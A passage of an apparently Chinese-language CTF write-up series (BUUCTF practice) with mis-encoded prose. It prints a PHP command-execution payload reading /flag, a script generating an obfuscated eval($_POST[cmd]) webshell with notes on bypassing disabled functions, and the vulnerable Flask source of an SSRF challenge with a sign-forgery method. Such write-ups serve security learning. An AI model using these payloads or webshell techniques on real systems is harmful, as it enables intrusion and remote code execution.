<p>ÁÑ∂ÂêéÈáåÈù¢ÁöÑ5f 47 45 54Ë¶ÅÁî®dechex()ÂáΩÊï∞Â∞Ü10ËøõÂà∂Êï∞ËΩ¨Êç¢‰∏∫16ËøõÂà∂ÁöÑÊï∞</p>
<p>dechex(1598506324)Ôºå1598506324ËΩ¨Êç¢‰∏∫16ËøõÂà∂Â∞±ÊòØ5f 47 45 54</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="err">?</span><span class="n">c</span><span class="o">=$</span><span class="n">pi</span><span class="o">=</span><span class="n">base_convert</span><span class="p">(</span><span class="mi">37907361743</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">)(</span><span class="n">dechex</span><span class="p">(</span><span class="mi">1598506324</span><span class="p">));(</span><span class="o">$$</span><span class="n">pi</span><span class="p">){</span><span class="n">pi</span><span class="p">}((</span><span class="o">$$</span><span class="n">pi</span><span class="p">){</span><span class="nb">abs</span><span class="p">})</span><span class="o">&amp;</span><span class="n">pi</span><span class="o">=</span><span class="n">system</span><span class="o">&amp;</span><span class="nb">abs</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019rce-me">[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]RCE ME
</h2><p>‰∏ä‰º†webshellÔºåËöÅÂâëËøûÊé•,Ê≠£ÂàôÁî®ÂèñÂèçÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;assert&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="s1">&#39;(eval($_POST[cmd]))&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏§‰∏™ÂèÇÊï∞Ë¶ÅÁî®ÔºàÔºâÈöîÂºÄ</p>
<p>Áî±‰∫éÂëΩ‰ª§ÊâßË°åÂèÇÊï∞Ë¢´ËøáÊª§‰∫ÜÔºåÁî®ËöÅÂâëÊèí‰ª∂ÁªïËøá</p>
<p>Áõ¥Êé•/readflag</p>
<h2 id="de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#! /usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># #encoding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="n">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s1">&#39;latin1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">secert_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Task</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>		<span class="c1">#ÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑËµãÂÄºÂáΩÊï∞</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">action</span> <span class="o">=</span> <span class="n">action</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">param</span> <span class="o">=</span> <span class="n">param</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sign</span> <span class="o">=</span> <span class="n">sign</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">)):</span>		<span class="c1">#Â¶ÇÊûúÊ≤°ÊúâËØ•Êñá‰ª∂Â§πÔºåÂàôÂàõÁ´ã‰∏Ä‰∏™Êñá‰ª∂Â§π</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">Exec</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">checkSign</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;scan&#34;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">tmpfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./</span><span class="si">%s</span><span class="s2">/result.txt&#34;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>   <span class="c1">#Ê≥®ÊÑèwÔºåÂèØ‰ª•ÂØπresult.txtÊñá‰ª∂ËøõË°å‰øÆÊîπ</span>
</span></span><span class="line"><span class="cl">                <span class="n">resp</span> <span class="o">=</span> <span class="n">scan</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">resp</span> <span class="o">==</span> <span class="s2">&#34;Connection Timeout&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">                    <span class="n">tmpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>	<span class="c1">#Ëøô‰∏™Â∞Üresp‰∏≠ÁöÑÊï∞ÊçÆÂÜôÂÖ•result.txt‰∏≠ÔºåÂèØ‰ª•Âà©Áî®‰∏∫Â∞Üflag.txt‰∏≠ÁöÑÊï∞ÊçÆÊîæËøõresult.txt‰∏≠</span>
</span></span><span class="line"><span class="cl">                    <span class="n">tmpfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;read&#34;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./</span><span class="si">%s</span><span class="s2">/result.txt&#34;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>	<span class="c1">#ÊâìÂºÄÊñπÂºè‰∏∫Âè™ËØª</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>	<span class="c1">#ËØªÂèñresult.txt‰∏≠ÁöÑÊï∞ÊçÆ</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;Action Error&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;Sign Error&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">checkSign</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">getSign</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">sign</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/geneSign&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">geneSign</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;param&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="s2">&#34;scan&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/De1ta&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>		<span class="c1">#Ê≥®ÊÑèËøô‰∏™ÁªëÂÆöÔºåÊé•‰∏ãÊù•ÁöÑÂá†‰∏™ÂáΩÊï∞ÈÉΩÂæàÈáçË¶ÅÔºåËøô‰∏™Áõ∏ÂΩì‰∫écËØ≠Ë®ÄÈáåÈù¢ÁöÑ‰∏ªÂáΩÊï∞ÔºåÊé•‰∏ãÊù•ÊòØË∞ÉÁî®ÂÖ∂‰ªñÂáΩÊï∞ÁöÑËøáÁ®ã</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">challenge</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;action&#34;</span><span class="p">))</span>		<span class="c1">#cookie‰º†ÈÄíactionÂèÇÊï∞ÔºåÂØπÂ∫î‰∏çÂêåÁöÑÂ§ÑÁêÜÊñπÂºè</span>
</span></span><span class="line"><span class="cl">    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;param&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>		<span class="c1">#‰º†ÈÄígetÊñπÂºèÁöÑÂèÇÊï∞param</span>
</span></span><span class="line"><span class="cl">    <span class="n">sign</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;sign&#34;</span><span class="p">))</span>			<span class="c1">#cookie‰º†ÈÄísignÂèÇÊï∞sign</span>
</span></span><span class="line"><span class="cl">    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>				<span class="c1">#Ëé∑ÂèñËØ∑Ê±ÇÁ´ØÁöÑipÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">waf</span><span class="p">(</span><span class="n">param</span><span class="p">)):</span>			<span class="c1">#Ë∞ÉÁî®wafÂáΩÊï∞ËøõË°åËøáÊª§</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;No Hacker!!!!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">task</span> <span class="o">=</span> <span class="n">Task</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span> 			<span class="c1">#ÂàõÂª∫TaskÁ±ªÂØπË±°</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">task</span><span class="o">.</span><span class="n">Exec</span><span class="p">())</span>			<span class="c1">#‰ª•jsonÁöÑÂΩ¢ÂºèËøîÂõûÂà∞ÂÆ¢Êà∑Á´Ø</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;code.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">socket</span><span class="o">.</span><span class="n">setdefaulttimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">param</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">50</span><span class="p">]</span>		<span class="c1">#Ëøô‰∏™ÂèØ‰ª•Âà©Áî®‰∏∫ËÆøÈóÆflag.txt„ÄÇËØªÂèñÁÑ∂Âêé‰∏∫‰∏ã‰∏ÄÊ≠•Â∞Üflag.txtÊñá‰ª∂‰∏≠ÁöÑ‰∏úË•øÊîæÂà∞result.txt‰∏≠ÂÅöÈì∫Âû´</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Connection Timeout&#34;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>				<span class="c1">#getSignÁöÑ‰ΩúÁî®ÊòØÊãºÊé•secret_key,param,actionÔºåÁÑ∂ÂêéËøîÂõûÊãºÊé•ÂêéÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑmd5Âä†ÂØÜÂÄº</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">secert_key</span> <span class="o">+</span> <span class="n">param</span> <span class="o">+</span> <span class="n">action</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>			<span class="c1">#Â∞Ü‰º†ÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ËøõË°åmd5Âä†ÂØÜ</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>						<span class="c1">#Èò≤ÁÅ´Â¢ôÁöÑ‰ΩúÁî®ÊòØÂà§Êñ≠ÂºÄÂ§¥ÁöÑÂá†‰∏™Â≠óÊØçÊòØÂê¶ÊòØgopher ÊàñËÄÖÊòØfile  Â¶ÇÊûúÊòØÁöÑËØùÔºåËøîÂõûtrue</span>
</span></span><span class="line"><span class="cl">    <span class="n">check</span><span class="o">=</span><span class="n">param</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;gopher&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">9999</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>/geneSignË∑ØÁî±‰∏ãÈù¢‰ºöË∞ÉÁî®getsignÂáΩÊï∞ÔºåË∑üËøõ‰ºöÊúâMD5ÂìàÂ∏åÔºå<code> return hashlib.md5(secert_key + param + action).hexdigest()</code>,Êàë‰ª¨‰º†ÂÖ•flag.txtreadÂ∞±‰ºöË¢´ÊãºÊé•‰∏∫secert_key+flag.txt+read+scan,ÁÑ∂ÂêéÂ∞±Êª°Ë∂≥‰∏ãÈù¢Â∞Üflag.txtÂÜôÂÖ•result.txtÔºåÁÑ∂ÂêéÂÜçËØªÂèñresult.txtÔºå/geneSignË∑ØÁî±‰ºöÂõûÊòæhash,ÁÑ∂ÂêéÊàë‰ª¨Âú®/De1taË∑ØÁî±‰∏ãÈù¢ÁöÑcookie‰º†ÂÖ•Á¨¶ÂêàÊù°‰ª∂ÁöÑÂÄºÔºåÂ∞±ËÉΩËØªÂèñresult.txt</p>
<p>hash:<code>0ffa43c8b41c61f35e5f10c15ee8a3e6</code></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250220143443002.png"
	width="1741"
	height="627"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250220143443002_hu1718320917810758838.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250220143443002_hu4882630927367451912.png 1024w"
	loading="lazy"
	
		alt="image-20250220143443002"
	
	
		class="gallery-image" 
		data-flex-grow="277"
		data-flex-basis="666px"
	
></p>
<h2 id="bjdctf2020easysearch">[BJDCTF2020]EasySearch
</h2><p>ÁõÆÂΩïÊâ´ÊèèÊâ´Âá∫index.php.swp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">	<span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">get_hash</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;</span><span class="p">;</span>
